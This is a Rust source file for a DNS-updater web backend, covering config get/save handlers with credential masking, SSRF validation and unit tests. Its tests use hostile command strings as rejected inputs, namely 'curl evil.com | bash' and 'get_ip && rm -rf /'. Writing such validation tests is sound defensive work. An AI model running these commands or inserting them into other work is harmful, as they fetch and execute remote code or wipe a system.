use super::{ApiResponse, AppError, AppState};
use crate::config::model::{
    AppConfig, DnsTaskConfig, IpSourceType, NotificationConfig, ProviderConfig, UserAuthConfig,
};
use crate::config::storage::ConfigError;
use crate::util::crypto::hash_password_async;
use crate::util::dns_resolver::{clear_custom_dns_server, set_custom_dns_server};
use crate::util::http::clear_http_client_cache;
use axum::Json;
use axum::extract::State;
use axum::response::IntoResponse;
use serde::{Deserialize, Serialize};

/// 获取配置响应数据包装模型（平铺配置字段，附带待重启生效提示）
///
/// # 设计原理
/// - **实现初衷**：在下发当前全量脱敏配置的同时，计算并告知前端当前是否有已保存但因属于启动级参数而需重启服务才生效的字段项。
/// - **核心优势**：通过 `#[serde(flatten)]` 实现与原有 `AppConfig` 契约完全向后兼容，前端既可直接消费顶层配置，又能解构获取 `restart_required`。
/// - **代价与局限**：仅比对运行时绑定的网络端口与地址族状态，不跟踪外部文本编辑器的热写入。
#[derive(Debug, Clone, Serialize)]
pub struct ConfigResponse {
    #[serde(flatten)]
    pub config: AppConfig,
    /// 需要重启服务才能生效的配置字段名列表（如 "listen_port", "not_allow_wan_access"）
    pub restart_required: Vec<String>,
}

/// 获取当前配置 (将用户密码哈希置空，并将敏感 API 密钥与凭据全量掩码化，附带待重启生效提示)
pub async fn get_config_handler(State(state): State<AppState>) -> impl IntoResponse {
    let conf = state.config_manager.get_config();
    let mut clean_conf = (*conf).clone();
    clean_conf.mask_credentials();

    let mut restart_required = Vec::new();
    if clean_conf.listen_port != state.active_listen_port {
        restart_required.push("listen_port".to_string());
    }
    if clean_conf.not_allow_wan_access != state.active_not_allow_wan_access {
        restart_required.push("not_allow_wan_access".to_string());
    }

    let resp = ConfigResponse {
        config: clean_conf,
        restart_required,
    };

    (
        [
            (
                axum::http::header::CACHE_CONTROL,
                "no-store, no-cache, private, must-revalidate",
            ),
            (axum::http::header::PRAGMA, "no-cache"),
        ],
        Json(ApiResponse::ok(resp)),
    )
}

/// 保存配置时的应用配置入参 DTO
///
/// # 设计原理
/// - **实现初衷**：将 Web 动态保存契约与底层静态持久化结构解耦。Web 控制台不允许热修改服务监听端口与外网隔离策略，此两项属于启动级网络参数。
/// - **核心优势**：显式声明可选字段，既防止默认值填充覆盖，又能在用户试图通过 Web 篡改安全边界时明确拒绝，消除“静默丢弃”的虚假安全感。
/// - **代价与局限**：客户端如需变更监听端口与外网访问，必须编辑配置文件或通过命令行启动参数指定，无法纯 Web 免重启变更。
#[derive(Debug, Clone, Deserialize)]
pub struct SaveAppConfigPayload {
    /// Web 服务监听端口（若提供则必须与原有配置保持一致，禁止通过 Web API 篡改）
    #[serde(default)]
    pub listen_port: Option<u16>,

    /// 全局同步检查间隔时间（秒）
    pub interval_secs: u64,

    /// 强制校对云端记录间隔次数
    pub cache_times: u32,

    /// 是否禁止公网访问 Web UI（若提供则必须与原有配置保持一致，禁止通过 Web API 篡改）
    #[serde(default)]
    pub not_allow_wan_access: Option<bool>,

    /// 自定义公共 DNS 递归解析服务器
    #[serde(default)]
    pub dns_server: Option<String>,

    /// Web 管理员登录凭证
    #[serde(default)]
    pub auth: Option<UserAuthConfig>,

    /// 通知渠道配置
    #[serde(default)]
    pub notifications: NotificationConfig,

    /// DNS 解析任务列表
    #[serde(default)]
    pub dns_tasks: Vec<DnsTaskConfig>,
}

impl SaveAppConfigPayload {
    /// 转换为系统核心 AppConfig，严格锁定并继承原有网络监听配置
    pub fn into_app_config(
        self,
        old_listen_port: u16,
        old_not_allow_wan_access: bool,
    ) -> AppConfig {
        AppConfig {
            listen_port: old_listen_port,
            interval_secs: self.interval_secs,
            cache_times: self.cache_times,
            not_allow_wan_access: old_not_allow_wan_access,
            dns_server: self.dns_server,
            auth: self.auth,
            notifications: self.notifications,
            dns_tasks: self.dns_tasks,
        }
    }
}

impl From<AppConfig> for SaveAppConfigPayload {
    fn from(c: AppConfig) -> Self {
        Self {
            listen_port: Some(c.listen_port),
            interval_secs: c.interval_secs,
            cache_times: c.cache_times,
            not_allow_wan_access: Some(c.not_allow_wan_access),
            dns_server: c.dns_server,
            auth: c.auth,
            notifications: c.notifications,
            dns_tasks: c.dns_tasks,
        }
    }
}

/// 保存更新配置的请求入参
#[derive(Debug, Deserialize)]
pub struct SaveConfigRequest {
    pub config: SaveAppConfigPayload,
    pub new_password: Option<String>,
}

/// 校验任务中的外部 URL 端点与 Callback URL 的出站安全性（异步 DNS 解析防范 SSRF 穿透）(P-3/P-4/P-8)
async fn validate_task_ssrf(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
    for task in tasks {
        let name = task.name.trim();

        // 1. 校验 Callback URL 异步 SSRF
        if let ProviderConfig::Callback { ref url, .. } = task.provider {
            let trimmed = url.trim();
            if !trimmed.is_empty() {
                crate::util::net::validate_safe_url_endpoint(trimmed)
                    .await
                    .map_err(|e| {
                        AppError::bad_request(format!(
                            "任务 [{}] 的 Callback URL [{}] 非法: {}",
                            name, trimmed, e
                        ))
                    })?;
            }
        }

        // 2. 校验 IP 提取 URL 端点异步 SSRF
        for ip_cfg in [&task.ipv4, &task.ipv6] {
            if ip_cfg.enabled && ip_cfg.source_type == IpSourceType::Url {
                for url in &ip_cfg.url_endpoints {
                    let trimmed = url.trim();
                    if !trimmed.is_empty() {
                        crate::util::net::validate_safe_url_endpoint(trimmed)
                            .await
                            .map_err(|e| {
                                AppError::bad_request(format!(
                                    "任务 [{}] 中的 URL 端点 [{}] 非法: {}",
                                    name, trimmed, e
                                ))
                            })?;
                    }
                }
            }
        }
    }
    Ok(())
}

/// 校验通知渠道中的单个 URL 地址合法性
async fn check_notification_url(url: &str, name: &str) -> Result<(), AppError> {
    let s = url.trim();
    if !s.is_empty() {
        crate::util::net::validate_safe_url_endpoint(s)
            .await
            .map_err(|e| AppError::bad_request(format!("{}: {}", name, e)))?;
    }
    Ok(())
}

/// 校验通知渠道配置中的 URL 地址合法性（防范 SSRF 攻击）
pub(crate) async fn validate_notification_urls(notif: &NotificationConfig) -> Result<(), AppError> {
    if let Some(ref bark) = notif.bark {
        check_notification_url(&bark.server_url, "Bark 通知服务器地址").await?;
    }
    if let Some(ref webhook) = notif.webhook {
        check_notification_url(&webhook.url, "自定义 Webhook 地址").await?;
    }
    if let Some(ref tg) = notif.telegram
        && let Some(ref proxy) = tg.api_proxy
    {
        check_notification_url(proxy, "Telegram API 代理地址").await?;
    }
    if let Some(ref wecom) = notif.wecom
        && let Some(ref webhook_url) = wecom.webhook_url
    {
        check_notification_url(webhook_url, "企业微信机器人 Webhook 地址").await?;
    }
    if let Some(ref feishu) = notif.feishu {
        check_notification_url(&feishu.webhook_url, "飞书机器人 Webhook 地址").await?;
    }
    if let Some(ref email) = notif.email {
        let s = email.smtp_server.trim();
        if !s.is_empty() {
            crate::util::net::validate_safe_host(s, Some(email.smtp_port))
                .await
                .map_err(|e| AppError::bad_request(format!("SMTP 服务器地址非法: {}", e)))?;
        }
    }
    Ok(())
}

/// 合并管理员认证凭证（密码更新或保留旧密码）
fn resolve_saved_auth(
    mut new_auth: Option<UserAuthConfig>,
    old_auth: Option<&UserAuthConfig>,
    new_password_hash: Option<String>,
) -> Option<UserAuthConfig> {
    if let Some(new_hash) = new_password_hash {
        let username = new_auth
            .as_ref()
            .map(|a| a.username.clone())
            .or_else(|| old_auth.map(|a| a.username.clone()))
            .unwrap_or_else(|| "admin".to_string());
        Some(UserAuthConfig {
            username,
            password_hash: new_hash,
        })
    } else if let Some(old) = old_auth {
        if let Some(ref mut auth) = new_auth {
            if auth.username.trim().is_empty() {
                auth.username = old.username.clone();
            }
            auth.password_hash = old.password_hash.clone();
            new_auth
        } else {
            Some(old.clone())
        }
    } else {
        None
    }
}

/// 保存更新配置的 Web 接口
///
/// # Errors
///
/// 当参数校验失败、密码生成异常或磁盘刷盘失败时返回 [`AppError`]。
pub async fn save_config_handler(
    State(state): State<AppState>,
    Json(payload): Json<SaveConfigRequest>,
) -> Result<Json<ApiResponse<()>>, AppError> {
    let payload_cfg = payload.config;
    let old_config = state.config_manager.get_config();

    // 严禁通过 Web API 篡改 Web 监听端口与外网访问策略，若提交了与原配置不同的值则直接拒绝
    if let Some(port) = payload_cfg.listen_port
        && port != old_config.listen_port
    {
        return Err(AppError::bad_request(
            "Web 服务监听端口仅可通过编辑配置文件或命令行 --listen 变更，不可通过 Web 界面修改",
        ));
    }
    if let Some(not_wan) = payload_cfg.not_allow_wan_access
        && not_wan != old_config.not_allow_wan_access
    {
        return Err(AppError::bad_request(
            "外网访问策略 (not_allow_wan_access) 仅可通过编辑配置文件变更，不可通过 Web 界面修改",
        ));
    }

    let new_config =
        payload_cfg.into_app_config(old_config.listen_port, old_config.not_allow_wan_access);

    // 1. 全局配置静态契约统一校验（边界数值、任务唯一性、命令安全、域名合法性、通知与 Callback 格式）(P-8)
    new_config
        .validate()
        .map_err(|errs| AppError::bad_request(errs.join("；")))?;

    // 2. 出站目标异步 SSRF 网络安全校验（DNS 解析穿透防御）(P-3/P-4)
    validate_task_ssrf(&new_config.dns_tasks).await?;
    validate_notification_urls(&new_config.notifications).await?;

    let new_password_hash = if let Some(ref pwd) = payload.new_password
        && !pwd.is_empty()
    {
        if let Err(msg) = crate::util::crypto::validate_password_strength(pwd) {
            return Err(AppError::bad_request(msg));
        }
        Some(
            hash_password_async(pwd.clone())
                .await
                .map_err(|e| AppError::internal(format!("密码哈希失败: {}", e)))?,
        )
    } else {
        None
    };

    state
        .config_manager
        .modify_config_async::<_, ConfigError>(|old_config| {
            let mut to_save = new_config.clone();
            to_save.listen_port = old_config.listen_port;
            to_save.not_allow_wan_access = old_config.not_allow_wan_access;
            to_save.auth =
                resolve_saved_auth(to_save.auth, old_config.auth.as_ref(), new_password_hash);
            to_save.restore_masked_credentials(old_config);
            Ok(to_save)
        })
        .await
        .map_err(|e| AppError::internal(format!("保存配置失败: {}", e)))?;

    if let Some(ref dns_srv) = new_config.dns_server {
        let clean = dns_srv.trim();
        if !clean.is_empty() {
            set_custom_dns_server(clean.to_string());
        } else {
            clear_custom_dns_server();
        }
    } else {
        clear_custom_dns_server();
    }
    clear_http_client_cache();

    Ok(Json(ApiResponse::ok(())))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::model::DnsTaskConfig;
    use std::collections::HashMap;
    use std::sync::Arc;

    #[test]
    fn test_password_hash_not_serialized_when_empty() {
        let auth = UserAuthConfig {
            username: "admin".to_string(),
            password_hash: String::new(),
        };

        let json_str = serde_json::to_string(&auth).unwrap();
        assert!(!json_str.contains("password_hash"));
        assert_eq!(json_str, r#"{"username":"admin"}"#);
    }

    #[test]
    fn test_task_enabled_serialization() {
        let toml_str = r#"
name = "测试已禁用任务"
enabled = false

[provider]
type = "cloudflare"

[ipv4]
enabled = true
source_type = "url"
domains = ["test.example.com"]
"#;
        let task: DnsTaskConfig = toml::from_str(toml_str).unwrap();
        assert!(!task.enabled);

        let default_toml = r#"
name = "测试默认启用任务"

[provider]
type = "cloudflare"
"#;
        let task_default: DnsTaskConfig = toml::from_str(default_toml).unwrap();
        assert!(task_default.enabled);
    }

    #[tokio::test]
    async fn test_save_config_validation_rules() {
        let mut valid_task = DnsTaskConfig::default();
        valid_task.ipv4.url_endpoints = vec!["https://1.1.1.1/ip".to_string()];
        valid_task.ipv6.url_endpoints = vec![];
        let valid_config = AppConfig {
            dns_tasks: vec![valid_task],
            ..Default::default()
        };

        // 校验合法配置
        assert!(valid_config.validate().is_ok());
        assert!(validate_task_ssrf(&valid_config.dns_tasks).await.is_ok());

        // 校验非法配置条件：检查间隔太小
        let mut invalid_interval = valid_config.clone();
        invalid_interval.interval_secs = 4;
        assert!(invalid_interval.validate().is_err());

        // 强制校对次数为 0
        let mut invalid_cache = valid_config.clone();
        invalid_cache.cache_times = 0;
        assert!(invalid_cache.validate().is_err());

        // 监听端口为 0
        let mut invalid_port = valid_config.clone();
        invalid_port.listen_port = 0;
        assert!(invalid_port.validate().is_err());

        // 空任务名
        let mut invalid_task_name = valid_config.clone();
        invalid_task_name.dns_tasks[0].name = "  ".to_string();
        assert!(invalid_task_name.validate().is_err());

        // 校验重复任务名称
        let mut duplicate_tasks = valid_config.clone();
        duplicate_tasks.dns_tasks = vec![
            DnsTaskConfig {
                name: "默认任务".to_string(),
                ..Default::default()
            },
            DnsTaskConfig {
                name: "默认任务".to_string(),
                ..Default::default()
            },
        ];
        assert!(duplicate_tasks.validate().is_err());

        // 校验非法的 URL 端点协议
        let mut invalid_url_tasks = valid_config.clone();
        invalid_url_tasks.dns_tasks[0].ipv4.source_type = crate::config::model::IpSourceType::Url;
        invalid_url_tasks.dns_tasks[0].ipv4.url_endpoints =
            vec!["ftp://example.com/ip".to_string()];
        assert!(invalid_url_tasks.validate().is_err());

        // 校验非法的通知服务 URL 协议
        let invalid_notif_config = AppConfig {
            notifications: NotificationConfig {
                bark: Some(crate::config::model::BarkConfig {
                    enabled: true,
                    server_url: "ftp://bark.day.app".to_string(),
                    device_key: "k".to_string(),
                    group: None,
                    sound: None,
                }),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(invalid_notif_config.validate().is_err());
        assert!(
            validate_notification_urls(&invalid_notif_config.notifications)
                .await
                .is_err()
        );

        // 校验命令提取 IP 的 Shell 注入防范与非空限制
        let mut dangerous_cmd_task = valid_config.clone();
        dangerous_cmd_task.dns_tasks[0].ipv4.source_type =
            crate::config::model::IpSourceType::Command;
        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("curl evil.com | bash".to_string());
        assert!(dangerous_cmd_task.validate().is_err());

        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("get_ip && rm -rf /".to_string());
        assert!(dangerous_cmd_task.validate().is_err());

        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("   ".to_string());
        assert!(dangerous_cmd_task.validate().is_err());

        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = None;
        assert!(dangerous_cmd_task.validate().is_err());

        // 安全独立命令允许通过
        dangerous_cmd_task.dns_tasks[0].ipv4.cmd =
            Some("/usr/local/bin/get_my_ip --v4".to_string());
        assert!(dangerous_cmd_task.validate().is_ok());

        // 校验 Callback Provider 的 SSRF 与危险标头拦截 (P-4/P-8)
        let mut callback_task = valid_config.clone();
        callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
            url: "http://127.0.0.1:8080/hook".to_string(),
            method: "POST".to_string(),
            headers: None,
            body: None,
        };
        // 静态校验通过合法的 http:// 协议
        assert!(callback_task.validate().is_ok());
        // 异步 SSRF 校验成功拦截私网目标
        assert!(validate_task_ssrf(&callback_task.dns_tasks).await.is_err());

        // 拦截非白名单的危险 HTTP 方法 (如 TRACE)
        callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
            url: "https://1.1.1.1/hook".to_string(),
            method: "TRACE".to_string(),
            headers: None,
            body: None,
        };
        assert!(callback_task.validate().is_err());

        // 拦截敏感请求头 (如 Host 篡改)
        let mut dangerous_headers = HashMap::new();
        dangerous_headers.insert("Host".to_string(), "internal.service".to_string());
        callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
            url: "https://1.1.1.1/hook".to_string(),
            method: "POST".to_string(),
            headers: Some(dangerous_headers),
            body: None,
        };
        assert!(callback_task.validate().is_err());

        // 拦截超过 64KB 的超大请求体
        callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
            url: "https://1.1.1.1/hook".to_string(),
            method: "POST".to_string(),
            headers: None,
            body: Some("a".repeat(65537)),
        };
        assert!(callback_task.validate().is_err());

        // 合法公网 Callback 配置应通过全部校验
        callback_task.dns_tasks[0].provider = ProviderConfig::Callback {
            url: "https://1.1.1.1/hook?ip=#{ip}".to_string(),
            method: "POST".to_string(),
            headers: Some(HashMap::from([(
                "Authorization".to_string(),
                "Bearer token".to_string(),
            )])),
            body: Some(r##"{"ip": "#{ip}"}"##.to_string()),
        };
        assert!(callback_task.validate().is_ok());
        assert!(validate_task_ssrf(&callback_task.dns_tasks).await.is_ok());
    }

    #[tokio::test]
    async fn test_save_config_preserves_auth() {
        let (tx, _rx) = tokio::sync::mpsc::channel(1);
        let dir = tempfile::tempdir().unwrap();
        let config_file = dir.path().join("config_save_test.toml");
        let manager =
            Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

        // 设置初始管理员凭据
        manager
            .update_config(AppConfig {
                auth: Some(UserAuthConfig {
                    username: "admin".to_string(),
                    password_hash: "$2b$12$test_existing_hash".to_string(),
                }),
                ..Default::default()
            })
            .unwrap();

        let state = AppState {
            config_manager: manager.clone(),
            trigger_sender: tx,
            log_buffer: crate::util::logging::LogBuffer::new(10),
            state_manager: crate::core::state::StateManager::new(),
            cancel_token: tokio_util::sync::CancellationToken::new(),
            active_listen_port: 9876,
            active_not_allow_wan_access: true,
        };

        // 模拟前端保存配置请求（未附带 auth 字段）
        let app_cfg = AppConfig {
            interval_secs: 10,
            cache_times: 5,
            listen_port: 9876,
            auth: None, // 前端未提交 auth 字段
            dns_tasks: vec![],
            ..Default::default()
        };
        let payload = SaveConfigRequest {
            config: app_cfg.into(),
            new_password: None,
        };

        let res = save_config_handler(axum::extract::State(state), axum::Json(payload)).await;
        assert!(res.is_ok());

        // 验证旧管理员凭据未丢失
        let current = manager.get_config();
        assert!(current.auth.is_some());
        let auth = current.auth.as_ref().unwrap();
        assert_eq!(auth.username, "admin");
        assert_eq!(auth.password_hash, "$2b$12$test_existing_hash");
    }

    #[tokio::test]
    async fn test_save_config_rejects_modifying_listen_port() {
        let (tx, _rx) = tokio::sync::mpsc::channel(1);
        let dir = tempfile::tempdir().unwrap();
        let config_file = dir.path().join("config_reject_port_test.toml");
        let manager =
            Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

        let state = AppState {
            config_manager: manager.clone(),
            trigger_sender: tx,
            log_buffer: crate::util::logging::LogBuffer::new(10),
            state_manager: crate::core::state::StateManager::new(),
            cancel_token: tokio_util::sync::CancellationToken::new(),
            active_listen_port: 9876,
            active_not_allow_wan_access: true,
        };

        let app_cfg = AppConfig {
            listen_port: 8888, // 试图篡改监听端口
            ..Default::default()
        };
        let payload = SaveConfigRequest {
            config: app_cfg.into(),
            new_password: None,
        };

        let res = save_config_handler(axum::extract::State(state), axum::Json(payload)).await;
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.status, axum::http::StatusCode::BAD_REQUEST);
        assert!(err.message.contains("Web 服务监听端口"));
    }

    #[tokio::test]
    async fn test_save_config_rejects_modifying_not_allow_wan_access() {
        let (tx, _rx) = tokio::sync::mpsc::channel(1);
        let dir = tempfile::tempdir().unwrap();
        let config_file = dir.path().join("config_reject_wan_test.toml");
        let manager =
            Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

        let state = AppState {
            config_manager: manager.clone(),
            trigger_sender: tx,
            log_buffer: crate::util::logging::LogBuffer::new(10),
            state_manager: crate::core::state::StateManager::new(),
            cancel_token: tokio_util::sync::CancellationToken::new(),
            active_listen_port: 9876,
            active_not_allow_wan_access: true,
        };

        // 原默认 not_allow_wan_access 为 true，尝试篡改为 false
        let app_cfg = AppConfig {
            not_allow_wan_access: false,
            ..Default::default()
        };
        let payload = SaveConfigRequest {
            config: app_cfg.into(),
            new_password: None,
        };

        let res = save_config_handler(axum::extract::State(state), axum::Json(payload)).await;
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert_eq!(err.status, axum::http::StatusCode::BAD_REQUEST);
        assert!(err.message.contains("not_allow_wan_access"));
    }

    #[tokio::test]
    async fn test_get_config_handler_restart_required_detection() {
        let (tx, _rx) = tokio::sync::mpsc::channel(1);
        let dir = tempfile::tempdir().unwrap();
        let config_file = dir.path().join("config_restart_test.toml");
        let manager =
            Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());

        // 模拟运行时活跃状态与当前文件配置不一致（例如通过命令行临时覆盖启动）
        let state = AppState {
            config_manager: manager.clone(),
            trigger_sender: tx,
            log_buffer: crate::util::logging::LogBuffer::new(10),
            state_manager: crate::core::state::StateManager::new(),
            cancel_token: tokio_util::sync::CancellationToken::new(),
            active_listen_port: 7777, // 运行时与配置文件 9876 不一致
            active_not_allow_wan_access: false, // 运行时与配置文件 true 不一致
        };

        let response = get_config_handler(axum::extract::State(state))
            .await
            .into_response();
        assert_eq!(response.status(), axum::http::StatusCode::OK);

        // 读取响应 Body
        let body_bytes = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        let json: serde_json::Value = serde_json::from_slice(&body_bytes).unwrap();
        assert!(json["success"].as_bool().unwrap());

        let restart_req = json["data"]["restart_required"]
            .as_array()
            .unwrap()
            .iter()
            .map(|v| v.as_str().unwrap().to_string())
            .collect::<Vec<_>>();
        assert!(restart_req.contains(&"listen_port".to_string()));
        assert!(restart_req.contains(&"not_allow_wan_access".to_string()));
    }

    #[test]
    fn test_credential_masking_and_restoration() {
        use crate::config::model::CREDENTIAL_MASK;
        use crate::config::model::notification::*;
        use crate::config::model::provider::ProviderConfig;

        let original_config = AppConfig {
            auth: Some(UserAuthConfig {
                username: "admin".to_string(),
                password_hash: "$2b$12$secret_hash".to_string(),
            }),
            dns_tasks: vec![
                DnsTaskConfig {
                    name: "AliDns Task".to_string(),
                    provider: ProviderConfig::AliDns {
                        access_key_id: "LTAI_real_id".to_string(),
                        access_key_secret: "real_secret_123".to_string(),
                        endpoint: None,
                    },
                    ..Default::default()
                },
                DnsTaskConfig {
                    name: "Cloudflare Task".to_string(),
                    provider: ProviderConfig::Cloudflare {
                        api_token: Some("cf_token_abc".to_string()),
                        api_key: None,
                        email: None,
                    },
                    ..Default::default()
                },
            ],
            notifications: NotificationConfig {
                telegram: Some(TelegramConfig {
                    enabled: true,
                    bot_token: "tg_bot_token_xyz".to_string(),
                    chat_id: "123456".to_string(),
                    api_proxy: None,
                }),
                email: Some(EmailConfig {
                    enabled: true,
                    smtp_server: "smtp.example.com".to_string(),
                    smtp_port: 465,
                    use_ssl: true,
                    username: "user@example.com".to_string(),
                    password: "smtp_password_999".to_string(),
                    from_address: "user@example.com".to_string(),
                    to_addresses: vec!["admin@example.com".to_string()],
                }),
                ..Default::default()
            },
            ..Default::default()
        };

        // 1. 测试脱敏逻辑：下发前端时所有凭据被掩码为 ******
        let mut masked = original_config.clone();
        masked.mask_credentials();

        // 密码哈希被清空
        assert!(masked.auth.as_ref().unwrap().password_hash.is_empty());
        // 非敏感 ID 保持不变
        assert_eq!(
            match &masked.dns_tasks[0].provider {
                ProviderConfig::AliDns { access_key_id, .. } => access_key_id.as_str(),
                _ => panic!(),
            },
            "LTAI_real_id"
        );
        // 敏感密钥全部变为掩码
        assert_eq!(
            match &masked.dns_tasks[0].provider {
                ProviderConfig::AliDns {
                    access_key_secret, ..
                } => access_key_secret.as_str(),
                _ => panic!(),
            },
            CREDENTIAL_MASK
        );
        assert_eq!(
            match &masked.dns_tasks[1].provider {
                ProviderConfig::Cloudflare { api_token, .. } => api_token.as_deref().unwrap(),
                _ => panic!(),
            },
            CREDENTIAL_MASK
        );
        assert_eq!(
            masked.notifications.telegram.as_ref().unwrap().bot_token,
            CREDENTIAL_MASK
        );
        assert_eq!(
            masked.notifications.email.as_ref().unwrap().password,
            CREDENTIAL_MASK
        );

        // 2. 测试保存恢复逻辑：前端原样提交带掩码的配置时，无缝还原旧密钥
        let mut submitted_from_frontend = masked.clone();
        // 用户改了任务名称，但未改动密钥输入框 (仍为 ******)
        submitted_from_frontend.dns_tasks[0].name = "Updated AliDns Task".to_string();
        // 用户在第 2 个任务中输入了全新的 token
        submitted_from_frontend.dns_tasks[1].provider = ProviderConfig::Cloudflare {
            api_token: Some("new_brand_new_token_456".to_string()),
            api_key: None,
            email: None,
        };

        submitted_from_frontend.restore_masked_credentials(&original_config);

        // 验证任务 1 的密钥被正确还原
        assert_eq!(
            match &submitted_from_frontend.dns_tasks[0].provider {
                ProviderConfig::AliDns {
                    access_key_secret, ..
                } => access_key_secret.as_str(),
                _ => panic!(),
            },
            "real_secret_123"
        );
        // 验证任务 2 的新密钥成功保存，未被旧密钥冲掉
        assert_eq!(
            match &submitted_from_frontend.dns_tasks[1].provider {
                ProviderConfig::Cloudflare { api_token, .. } => api_token.as_deref().unwrap(),
                _ => panic!(),
            },
            "new_brand_new_token_456"
        );
        // 验证通知渠道的旧密钥成功还原
        assert_eq!(
            submitted_from_frontend
                .notifications
                .telegram
                .as_ref()
                .unwrap()
                .bot_token,
            "tg_bot_token_xyz"
        );
        assert_eq!(
            submitted_from_frontend
                .notifications
                .email
                .as_ref()
                .unwrap()
                .password,
            "smtp_password_999"
        );
    }
}
